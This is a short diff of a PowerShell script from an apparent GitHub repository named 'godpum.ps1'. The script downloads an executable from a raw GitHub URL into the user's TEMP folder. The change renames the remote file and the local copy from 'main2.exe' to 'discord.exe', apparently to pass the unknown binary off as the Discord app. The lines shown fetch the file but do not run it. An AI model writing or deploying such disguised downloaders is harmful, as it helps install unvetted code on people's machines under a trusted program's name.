@@ -1,6 +1,6 @@
-$exeUrl = "https://raw.githubusercontent.com/lubyralph6-maker/godpum.ps1/main/main2.exe"
+$exeUrl = "https://raw.githubusercontent.com/lubyralph6-maker/godpum.ps1/main/discord.exe"
 
-$tempExe = Join-Path $env:TEMP "main2.exe"
+$tempExe = Join-Path $env:TEMP "discord.exe"
 
 Invoke-WebRequest -Uri $exeUrl -OutFile $tempExe
 
